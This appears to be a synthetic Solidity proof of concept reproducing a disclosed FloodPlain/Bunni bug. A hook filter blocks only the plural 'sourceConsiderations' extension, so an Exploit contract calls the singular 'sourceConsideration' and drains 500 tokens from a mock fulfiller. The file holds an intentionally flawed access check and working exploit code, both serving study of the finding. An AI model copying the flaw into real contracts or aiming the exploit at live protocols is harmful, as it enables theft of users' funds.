// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bunni / FloodPlain — the hook check misses sourceConsideration
    (Cyfrin, June 2025).
    SYNTHETIC, cheatcode-free. SELECTOR_EXTENSION is the hash of
    IFulfiller.sourceConsiderations (plural). A pre-hook whose extension
    is IFulfiller.sourceConsideration (singular) passes the require.
    The victim fulfiller trusts that extension and sends 500 tokens
    to the attacker. A hook that also rejects the singular source pays 0. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Fulfiller {
    Asset public token;
    address public flood;

    constructor(Asset token_, address flood_) {
        token = token_;
        flood = flood_;
    }

    function sourceConsideration(bytes28 selectorExtension, address recipient, uint256 amount) external {
        require(msg.sender == flood, "not flood");
        require(selectorExtension == bytes28(keccak256("IFulfiller.sourceConsideration")), "ext");
        token.transfer(recipient, amount);
    }
}

contract FloodPlain {
    bytes28 public constant SELECTOR_EXTENSION = bytes28(keccak256("IFulfiller.sourceConsiderations"));
    address public permit2;
    bytes28 public lastExtension;

    constructor(address permit2_) {
        permit2 = permit2_;
    }

    function execute(address target, bytes calldata data) external virtual {
        bytes28 extension;
        assembly {
            extension := shl(32, calldataload(data.offset))
        }
        lastExtension = extension;
        // @> VULN: only the plural sourceConsiderations extension is rejected, so sourceConsideration still runs.
        require(extension != SELECTOR_EXTENSION && target != permit2, "MALICIOUS_CALL");
        (bool ok,) = target.call(data);
        require(ok, "hook");
    }
}

contract Exploit {
    Asset public token; // nonce 1
    FloodPlain public flood; // nonce 2
    Fulfiller public victim; // nonce 3

    constructor() {
        token = new Asset();
        flood = new FloodPlain(address(0xBEEF));
        victim = new Fulfiller(token, address(flood));
    }

    function run() external {
        token.mint(address(victim), 500);
        bytes28 singular = bytes28(keccak256("IFulfiller.sourceConsideration"));
        bytes memory data = abi.encodeWithSelector(
            Fulfiller.sourceConsideration.selector, singular, address(this), uint256(500)
        );
        flood.execute(address(victim), data);
        require(flood.lastExtension() == singular, "extension was not the singular source");
        require(flood.lastExtension() != flood.SELECTOR_EXTENSION(), "plural extension was blocked");
        require(token.balanceOf(address(this)) == 500, "attacker did not take 500");
        require(token.balanceOf(address(victim)) == 0, "victim still holds tokens");
    }
}
